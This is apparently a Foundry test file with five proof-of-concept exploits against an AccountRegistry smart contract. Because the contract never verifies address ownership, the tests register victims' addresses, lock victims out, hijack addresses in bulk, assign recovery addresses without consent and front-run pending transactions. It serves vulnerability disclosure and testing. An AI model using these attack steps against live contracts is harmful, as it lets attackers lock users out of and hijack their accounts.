// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {AccountRegistry} from "../src/AccountRegistry.sol";

/**
 * @title Address Verification Spoofing Vulnerability Test
 * @notice This test demonstrates a critical vulnerability where an attacker can:
 *         1. Register an account using ANY address as an authenticator without permission
 *         2. Front-run legitimate users to hijack their intended authenticator addresses
 *         3. Lock victims out of creating their own accounts
 */
contract AddressVerificationSpoofingTest is Test {
    AccountRegistry public accountRegistry;

    address public VICTIM_ADDRESS = address(0xBEEF);
    address public ATTACKER_ADDRESS = address(0xBABE);
    address public RECOVERY_ADDRESS = address(0xDEAD);
    
    uint256 public constant OFFCHAIN_SIGNER_COMMITMENT = 0x1234567890;

    function setUp() public {
        accountRegistry = new AccountRegistry(30);
    }

    /**
     * @notice VULNERABILITY POC #1: Attacker registers account with victim's address WITHOUT signature
     * @dev This demonstrates that createAccount() does NOT verify that the caller owns
     *      the authenticator addresses being registered.
     */
    function test_VulnerabilityPOC_UnauthorizedAccountCreation() public {
        console.log("=== VULNERABILITY POC #1: Unauthorized Account Creation ===");
        console.log("Victim Address:", VICTIM_ADDRESS);
        console.log("Attacker Address:", ATTACKER_ADDRESS);
        
        // Attacker creates an array with VICTIM's address (without victim's permission!)
        address[] memory authenticatorAddresses = new address[](1);
        authenticatorAddresses[0] = VICTIM_ADDRESS; // Using victim's address without permission!
        
        uint256[] memory authenticatorPubkeys = new uint256[](1);
        authenticatorPubkeys[0] = 0;

        // Attacker calls createAccount from their own address
        // but registers VICTIM's address as the authenticator
        vm.prank(ATTACKER_ADDRESS);
        accountRegistry.createAccount(
            RECOVERY_ADDRESS,
            authenticatorAddresses,
            authenticatorPubkeys,
            OFFCHAIN_SIGNER_COMMITMENT
        );

        // Verify that VICTIM's address is now registered without their consent!
        uint256 packed = accountRegistry.authenticatorAddressToPackedAccountIndex(VICTIM_ADDRESS);
        uint256 accountIndex = uint256(uint192(packed));
        
        console.log("Account created successfully!");
        console.log("Account Index:", accountIndex);
        console.log("VICTIM's address is now linked to account:", accountIndex);
        
        // The victim's address is now unusable for their own account
        assertGt(accountIndex, 0, "Victim's address was registered without permission!");
        
        console.log("\n[CRITICAL] Attacker successfully registered victim's address without any signature verification!");
    }

    /**
     * @notice VULNERABILITY POC #2: Victim is locked out after attacker hijacks their address
     * @dev After attacker registers victim's address, victim cannot use it for their own account
     */
    function test_VulnerabilityPOC_VictimLockedOut() public {
        console.log("\n=== VULNERABILITY POC #2: Victim Locked Out ===");
        
        // Step 1: Attacker front-runs victim and registers their address
        address[] memory attackerAddresses = new address[](1);
        attackerAddresses[0] = VICTIM_ADDRESS;
        uint256[] memory authenticatorPubkeys = new uint256[](1);
        authenticatorPubkeys[0] = 0;

        vm.prank(ATTACKER_ADDRESS);
        accountRegistry.createAccount(
            RECOVERY_ADDRESS,
            attackerAddresses,
            authenticatorPubkeys,
            OFFCHAIN_SIGNER_COMMITMENT
        );
        console.log("Step 1: Attacker registered VICTIM's address");

        // Step 2: Victim tries to create their own account with their own address
        address[] memory victimAddresses = new address[](1);
        victimAddresses[0] = VICTIM_ADDRESS;
        uint256[] memory victimPubkeys = new uint256[](1);
        victimPubkeys[0] = 0;

        vm.prank(VICTIM_ADDRESS); // Victim is trying to register themselves
        vm.expectRevert("Authenticator already exists");
        accountRegistry.createAccount(
            address(0x1111), // Victim's own recovery address
            victimAddresses,
            victimPubkeys,
            OFFCHAIN_SIGNER_COMMITMENT + 1
        );
        
        console.log("Step 2: VICTIM CANNOT register their own address!");
        console.log("[CRITICAL] Victim is permanently locked out of using their address!");
    }

    /**
     * @notice VULNERABILITY POC #3: Attacker can register multiple victim addresses in one call
     * @dev Using createManyAccounts, attacker can hijack hundreds of addresses at once
     */
    function test_VulnerabilityPOC_MassAddressHijacking() public {
        console.log("\n=== VULNERABILITY POC #3: Mass Address Hijacking ===");
        
        uint256 numVictims = 10;
        address[] memory recoveryAddresses = new address[](numVictims);
        address[][] memory allAuthenticatorAddresses = new address[][](numVictims);
        uint256[][] memory allAuthenticatorPubkeys = new uint256[][](numVictims);
        uint256[] memory commitments = new uint256[](numVictims);

        // Attacker prepares to hijack 10 victim addresses
        for (uint256 i = 0; i < numVictims; i++) {
            address victimAddr = address(uint160(0x10000 + i));
            recoveryAddresses[i] = address(uint160(0x20000 + i));
            allAuthenticatorAddresses[i] = new address[](1);
            allAuthenticatorAddresses[i][0] = victimAddr; // Hijacking victim's address
            allAuthenticatorPubkeys[i] = new uint256[](1);
            allAuthenticatorPubkeys[i][0] = 0;
            commitments[i] = OFFCHAIN_SIGNER_COMMITMENT + i;
        }

        // Attacker hijacks all 10 addresses in ONE transaction
        vm.prank(ATTACKER_ADDRESS);
        uint256 gasStart = gasleft();
        accountRegistry.createManyAccounts(
            recoveryAddresses,
            allAuthenticatorAddresses,
            allAuthenticatorPubkeys,
            commitments
        );
        uint256 gasUsed = gasStart - gasleft();

        console.log("Successfully hijacked", numVictims, "addresses in one transaction");
        console.log("Gas used:", gasUsed);
        console.log("[CRITICAL] Attacker can hijack hundreds of addresses cheaply!");

        // Verify all addresses are hijacked
        for (uint256 i = 0; i < numVictims; i++) {
            address victimAddr = address(uint160(0x10000 + i));
            uint256 packed = accountRegistry.authenticatorAddressToPackedAccountIndex(victimAddr);
            assertGt(packed, 0, "Address should be hijacked");
        }
    }

    /**
     * @notice VULNERABILITY POC #4: Attacker can set victim's address as recovery address
     * @dev Even worse: attacker can set ANY address as the recovery address without permission
     */
    function test_VulnerabilityPOC_RecoveryAddressHijacking() public {
        console.log("\n=== VULNERABILITY POC #4: Recovery Address Hijacking ===");
        
        address[] memory authenticatorAddresses = new address[](1);
        authenticatorAddresses[0] = address(0x9999); // Attacker's controlled address
        uint256[] memory authenticatorPubkeys = new uint256[](1);
        authenticatorPubkeys[0] = 0;

        // Attacker sets VICTIM's address as the recovery address without permission!
        vm.prank(ATTACKER_ADDRESS);
        accountRegistry.createAccount(
            VICTIM_ADDRESS, // Victim's address set as recovery (without permission!)
            authenticatorAddresses,
            authenticatorPubkeys,
            OFFCHAIN_SIGNER_COMMITMENT
        );

        uint256 accountIndex = 1;
        address recoveryAddr = accountRegistry.accountIndexToRecoveryAddress(accountIndex);
        
        console.log("Recovery address for account 1:", recoveryAddr);
        console.log("Victim's address:", VICTIM_ADDRESS);
        assertEq(recoveryAddr, VICTIM_ADDRESS, "Victim's address is recovery address without consent!");
        
        console.log("[CRITICAL] Victim's address is now responsible for account recovery without their knowledge!");
    }

    /**
     * @notice VULNERABILITY POC #5: Front-running attack scenario
     * @dev Demonstrates realistic attack where attacker monitors mempool and front-runs victim
     */
    function test_VulnerabilityPOC_FrontRunningScenario() public {
        console.log("\n=== VULNERABILITY POC #5: Front-Running Scenario ===");
        
        // Victim prepares their transaction (visible in mempool)
        address[] memory victimAddresses = new address[](1);
        victimAddresses[0] = VICTIM_ADDRESS;
        uint256[] memory victimPubkeys = new uint256[](1);
        victimPubkeys[0] = 0x123456;

        console.log("Victim broadcasts transaction to create account with address:", VICTIM_ADDRESS);
        
        // Attacker sees this in mempool and front-runs with higher gas price
        address[] memory attackerAddresses = new address[](1);
        attackerAddresses[0] = VICTIM_ADDRESS; // Using victim's address!
        uint256[] memory attackerPubkeys = new uint256[](1);
        attackerPubkeys[0] = 0xDEADBEEF; // Attacker's pubkey

        console.log("Attacker front-runs with same address but different pubkey");
        
        vm.prank(ATTACKER_ADDRESS);
        accountRegistry.createAccount(
            address(0xbad1),
            attackerAddresses,
            attackerPubkeys,
            OFFCHAIN_SIGNER_COMMITMENT
        );

        console.log("Attacker's transaction confirmed first");
        
        // Now victim's transaction will fail
        vm.prank(VICTIM_ADDRESS);
        vm.expectRevert("Authenticator already exists");
        accountRegistry.createAccount(
            address(0x1ce1),
            victimAddresses,
            victimPubkeys,
            OFFCHAIN_SIGNER_COMMITMENT + 1
        );

        console.log("Victim's transaction reverts!");
        console.log("[CRITICAL] Front-running attack successful!");
    }

    /**
     * @notice Impact Summary
     */
}

